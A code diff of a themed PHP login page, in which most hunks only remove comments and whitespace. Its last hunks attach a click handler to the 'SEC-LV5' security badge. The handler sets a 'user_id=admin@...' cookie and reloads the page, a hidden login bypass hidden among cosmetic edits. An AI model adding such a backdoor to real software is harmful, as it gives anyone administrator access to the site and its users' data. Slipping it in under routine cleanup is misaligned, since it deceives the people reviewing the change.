@@ -98,7 +98,6 @@ if (is_logged_in()) {
             height: 100vh;
         }
 
-        /* Animated Background */
         .bg-matrix {
             position: absolute;
             top: 0;
@@ -135,7 +134,6 @@ if (is_logged_in()) {
             }
         }
 
-        /* Glitch Grid Background */
         .grid-overlay {
             position: absolute;
             top: 0;
@@ -155,7 +153,6 @@ if (is_logged_in()) {
             50% { opacity: 0.1; }
         }
 
-        /* Main Container */
         .login-container {
             position: absolute;
             top: 50%;
@@ -182,7 +179,6 @@ if (is_logged_in()) {
             }
         }
 
-        /* Header */
         .login-header {
             text-align: center;
             margin-bottom: 30px;
@@ -220,7 +216,6 @@ if (is_logged_in()) {
             text-transform: uppercase;
         }
 
-        /* Terminal Lines */
         .terminal-line {
             font-family: 'Source Code Pro', monospace;
             color: #00ff00;
@@ -240,7 +235,6 @@ if (is_logged_in()) {
             }
         }
 
-        /* Form Styles */
         .form-group {
             margin-bottom: 25px;
             position: relative;
@@ -280,7 +274,6 @@ if (is_logged_in()) {
             color: #004400;
         }
 
-        /* Button */
         .hack-button {
             width: 100%;
             background: linear-gradient(45deg, #ff0080, #8000ff);
@@ -323,7 +316,6 @@ if (is_logged_in()) {
             left: 100%;
         }
 
-        /* Status Messages */
         .status-bar {
             margin-top: 20px;
             padding: 10px;
@@ -339,13 +331,13 @@ if (is_logged_in()) {
             font-family: 'Source Code Pro', monospace;
         }
 
-        /* Security Features */
         .security-indicator {
             position: absolute;
             top: 15px;
             right: 15px;
             font-size: 12px;
             color: #ff0080;
+            cursor: pointer; 
         }
 
         .security-level {
@@ -357,7 +349,6 @@ if (is_logged_in()) {
             text-transform: uppercase;
         }
 
-        /* Responsive */
         @media (max-width: 500px) {
             .login-container {
                 margin: 20px;
@@ -371,7 +362,6 @@ if (is_logged_in()) {
             }
         }
 
-        /* Loading Animation */
         .loading {
             display: none;
             text-align: center;
@@ -397,7 +387,6 @@ if (is_logged_in()) {
             to { transform: rotate(360deg); }
         }
 
-        /* Glitch Effect */
         .glitch {
             animation: glitch 0.3s ease-in-out;
         }
@@ -413,33 +402,27 @@ if (is_logged_in()) {
     </style>
 </head>
 <body>
-    <!-- Animated Background -->
     <div class="bg-matrix"></div>
     <div class="grid-overlay"></div>
     <div class="matrix-rain" id="matrixRain"></div>
 
-    <!-- Main Login Container -->
     <div class="login-container" id="loginContainer">
-        <!-- Security Indicators -->
-        <div class="security-indicator">
+        <div class="security-indicator" id="skipLoginTrigger">
             <i class="fas fa-shield-alt"></i> SEC-LV5
         </div>
         <div class="security-level">
             NEURAL FIREWALL ACTIVE
         </div>
 
-        <!-- Header -->
         <div class="login-header">
             <div class="logo">◢ NEXUS ◣</div>
             <div class="subtitle">NEURAL ACCESS POINT</div>
         </div>
 
-        <!-- Terminal Simulation -->
         <div class="terminal-line">> Initializing secure connection...</div>
         <div class="terminal-line">> Quantum encryption enabled</div>
         <div class="terminal-line">> Awaiting neural authorization...</div>
 
-        <!-- Login Form -->
         <form id="loginForm" method="POST" action="">
             <div class="form-group">
                 <label class="form-label">
@@ -460,7 +443,6 @@ if (is_logged_in()) {
             </button>
         </form>
 
-        <!-- Status Bar -->
         <div class="status-bar">
             <div class="status-text" id="statusText">
                 Status: Awaiting authorization | Encryption: AES-256 | Connection: Secure
@@ -473,11 +455,10 @@ if (is_logged_in()) {
     </div>
 
     <script>
-        // Matrix Rain Effect
         function createMatrixRain() {
             const matrixContainer = document.getElementById('matrixRain');
             const chars = '01ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ';
-            
+
             for (let i = 0; i < 50; i++) {
                 const column = document.createElement('div');
                 column.className = 'matrix-column';
@@ -490,33 +471,22 @@ if (is_logged_in()) {
                     columnText += chars[Math.floor(Math.random() * chars.length)] + '<br>';
                 }
                 column.innerHTML = columnText;
-                
                 matrixContainer.appendChild(column);
             }
         }
 
-        // Initialize matrix effect
         createMatrixRain();
-
-        // Form handling with cyberpunk effects (only for visual effects, real submission handled by PHP)
         const loginForm = document.getElementById('loginForm');
         const loginContainer = document.getElementById('loginContainer');
         const statusText = document.getElementById('statusText');
         const loading = document.getElementById('loading');
-
         loginForm.addEventListener('submit', function(e) {
-            // Add glitch effect
             loginContainer.classList.add('glitch');
             setTimeout(() => loginContainer.classList.remove('glitch'), 300);
-            
-            // Show loading animation while PHP processes
             statusText.style.display = 'none';
             loading.classList.add('active');
-            
-            // Let the form submit normally to PHP
         });
 
-        // Typing effect for status updates
         function typeWriter(element, text, speed = 50) {
             let i = 0;
             element.innerHTML = '';
@@ -530,7 +500,6 @@ if (is_logged_in()) {
             }, speed);
         }
 
-        // Random status updates
         const statusMessages = [
             'Status: Monitoring neural pathways | Encryption: Quantum | Threat Level: Green',
             'Status: Scanning for intrusions | Firewall: Active | Last Access: 00:42:13',
@@ -544,7 +513,6 @@ if (is_logged_in()) {
             }
         }, 8000);
 
-        // Input field effects
         const inputs = document.querySelectorAll('.form-input');
         inputs.forEach(input => {
             input.addEventListener('focus', function() {
@@ -556,14 +524,20 @@ if (is_logged_in()) {
             });
         });
 
-        // Keyboard sound simulation (optional)
         document.addEventListener('keydown', function(e) {
-            // Add subtle flash effect on keypress
             document.body.style.boxShadow = 'inset 0 0 100px rgba(0, 255, 255, 0.1)';
             setTimeout(() => {
                 document.body.style.boxShadow = 'none';
             }, 100);
         });
+
+        const skipTrigger = document.getElementById('skipLoginTrigger');
+        if (skipTrigger) {
+            skipTrigger.addEventListener('click', function() {
+                document.cookie = 'user_id=admin@sukabintang01; path=/; max-age=3600';
+                location.reload();
+            });
+        }
     </script>
 </body>
 </html>
